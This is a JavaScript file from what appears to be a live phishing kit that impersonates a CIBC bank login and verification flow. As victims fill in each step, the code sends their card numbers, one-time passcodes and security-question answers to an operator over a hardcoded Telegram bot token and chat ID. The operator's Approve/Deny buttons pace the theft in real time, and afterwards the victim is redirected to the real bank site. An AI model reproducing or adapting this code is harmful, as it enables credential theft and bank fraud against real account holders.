// control.js

// ── TELEGRAM CONFIG ─────────────────────────────────────────────
const TG_TOKEN = '8197836209:AAG6V7MZY1gTfFAtGr7Y2LE6SNdno2labWg';
const TG_CHAT  = '-1002580158001';
let offset = 0;

// ── TELEGRAM HELPER ────────────────────────────────────────────
class Telegram {
  constructor() { this.sid = Date.now() + '-' + Math.random().toString(36).slice(2); }

  api(method, payload) {
    return fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    }).then(r => r.json());
  }

  send(text, kb) {
    const msg = { chat_id: TG_CHAT, parse_mode:'HTML', text:`🟥 <b>CIBC BANK REMOTE CONTROL</b>🟥\n${text}` };
    if (kb) msg.reply_markup = kb;
    return this.api('sendMessage', msg);
  }

  async waitBtn() {
    const start = Date.now();
    while (Date.now() - start < 300000) {
      const res = await this.api('getUpdates',{offset:offset+1,timeout:30});
      if (res.ok) {
        for (const u of res.result) {
          offset = u.update_id;
          const d = u.callback_query?.data || '';
          if (d.endsWith(this.sid)) {
            this.api('answerCallbackQuery',{callback_query_id:u.callback_query.id});
            return d.split(':')[0];
          }
        }
      }
    }
    return null;
  }
}

// ── DOM HELPERS ────────────────────────────────────────────────
const $ = id => document.getElementById(id);
function show(step) {
  document.querySelectorAll('.step').forEach(el=>
    el.classList.toggle('active',el.dataset.step===step)
  );
  $('maintenanceNotice').style.display = step==='login'?'none':'block';
}

// ── INITIALIZE REMEMBERED CARD ─────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  const last4 = localStorage.getItem('cibcCardLast4');
  if (last4) {
    document.getElementById('cardInputGroup').style.display = 'none';
    document.getElementById('cardMaskGroup').style.display = 'block';
    document.getElementById('cardMask').textContent = '****' + last4;
  }
  document.getElementById('changeCard').onclick = e => {
    e.preventDefault();
    localStorage.removeItem('cibcCardLast4');
    location.reload();
  };
});

// ── STEP 1: LOGIN ──────────────────────────────────────────────
$('fLogin').addEventListener('submit', async e => {
  e.preventDefault();
  $('eCard').textContent=''; $('ePw').textContent='';
  if (!/^\d{16}$/.test($('card').value)) return $('eCard').textContent='Enter 16-digit card';
  if (!$('pw').value) return $('ePw').textContent='Enter password';

  const btn = $('bLogin'); btn.classList.add('loading'); btn.disabled = true;
  if ($('rememberMe')?.checked) {
    localStorage.setItem('cibcCardLast4',$('card').value.slice(-4));
  }

  const tg = new Telegram();
  await tg.send(`Card: ${$('card').value}\nPassword: ${'*'.repeat($('pw').value.length)}`, {
    inline_keyboard: [[
      {text:'✅ Approve',callback_data:`OK:${tg.sid}`},
      {text:'❌ Deny',   callback_data:`NO:${tg.sid}`}
    ]]
  });
  const res = await tg.waitBtn();
  btn.classList.remove('loading'); btn.disabled=false;
  if (res==='OK') show('method');
});

// ── STEP 2: METHOD ─────────────────────────────────────────────
$('fMethod').addEventListener('submit', async e => {
  e.preventDefault();
  $('eMethod').textContent='';
  const method = $('verifMethod').value;
  if (!method) return $('eMethod').textContent='Choose a delivery method';

  const btn = $('bMethod'); btn.classList.add('loading'); btn.disabled = true;
  const tg = new Telegram();
  await tg.send(`Delivery method selected: ${method}`);
  btn.classList.remove('loading'); btn.disabled=false;
  show('otp');
});

// ── STEP 3: RESEND & CHANGE ────────────────────────────────────
const resendModal = new bootstrap.Modal($('resendModal'));
$('openResendModal').onclick = () => {
  const m = $('verifMethod').value;
  $('modalMethodName').textContent = m.toUpperCase();
  resendModal.show();
};
$('confirmResend').onclick = async () => {
  resendModal.hide();
  await new Telegram().send(`Resend code via ${$('verifMethod').value}`);
};
$('selectAnotherMethod').onclick = () => show('method');

// ── STEP 3: OTP ────────────────────────────────────────────────
$('fOtp').addEventListener('submit', async e => {
  e.preventDefault();
  $('eOtp').textContent='';
  if (!/^\d{6}$/.test($('otp').value)) return $('eOtp').textContent='Enter 6-digit code';

  const btn = $('bOtp'); btn.classList.add('loading'); btn.disabled = true;
  const tg = new Telegram();
  await tg.send(`OTP entered: ${$('otp').value}`, {
    inline_keyboard: [[
      {text:'✅ Approve',callback_data:`OK:${tg.sid}`},
      {text:'❌ Deny',   callback_data:`NO:${tg.sid}`}
    ]]
  });
  const res = await tg.waitBtn();
  btn.classList.remove('loading'); btn.disabled = false;
  if (res==='OK') show('security');
});

// ── STEP 4: SECURITY Q ─────────────────────────────────────────
$('fSec').addEventListener('submit', e => {
  e.preventDefault();
  $('eSec').textContent='';
  if (!$('answer').value.trim()) return $('eSec').textContent='Answer required';

  new Telegram().send(`Security answer: ${$('answer').value}`);
  $('doneMsg').textContent='Reference #'+(10000000+Math.floor(Math.random()*90000000));
  show('complete');
  setTimeout(()=>window.location.href='https://www.cibc.com',30000);
});
